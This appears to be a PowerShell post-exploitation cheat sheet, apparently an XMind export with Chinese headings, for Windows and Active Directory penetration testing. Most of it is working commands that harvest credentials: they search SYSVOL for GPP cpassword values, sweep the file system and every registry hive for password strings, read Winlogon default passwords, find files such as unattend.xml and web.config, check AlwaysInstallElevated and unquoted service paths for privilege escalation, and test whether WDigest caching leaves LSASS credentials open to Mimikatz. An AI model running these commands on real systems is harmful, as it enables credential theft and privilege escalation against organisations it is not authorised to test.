([adsisearcher]"").Searchroot.maxPwdAge
([adsisearcher]"").Searchroot.pwdProperties

搜索GPP cpassword:
pushd \example.com\sysvol
gci * -Include *.xml -Recurse -EA SilentlyContinue | select-string cpassword
popd

脚本编写:
foreach ($f in $(gci)) {echo $f.Name}
gc file.txt | foreach { echo $_ }
foreach ($a in $(gc file.txt)) { echo $a }
1..255 | foreach{"10.0.10."+$_} > ips.txt

编码解码:
gc file.txt | out-file -encoding ASCII file.ascii.txt
gc file.txt | out-file -encoding UTF8 file.utf8.txt
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Text to encode"))
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("<base64 string here>"))
[System.Net.WebUtility]::UrlEncode('<text to encode>')
[System.Net.WebUtility]::UrlDecode('%3Ctext+to+decode%3E')
Add-Type -AssemblyName System.Web
[System.Web.HttpUtility]::HtmlEncode('<text to encode>')
Add-Type -AssemblyName System.Web
[System.Web.HttpUtility]::HtmlDecode('&lt;text to decode&gt;')

搜索敏感文件:
gci . -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue
gci . -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue
gci . -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue
gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue
在注册表项和值中搜索密码字符串
$pattern = "password"
$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"
# Search in registry keys
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }
# Search in registry values
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}

检查是否启用WDigest缓存(LSASS):
(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential
如果该值设置为0，则禁用缓存，并且Mimikatz将无效
如果不存在或设置为1，则启用缓存，Mimikatz将能够从LSASS进程内存中检索凭证

*XMind: ZEN - Trial Version*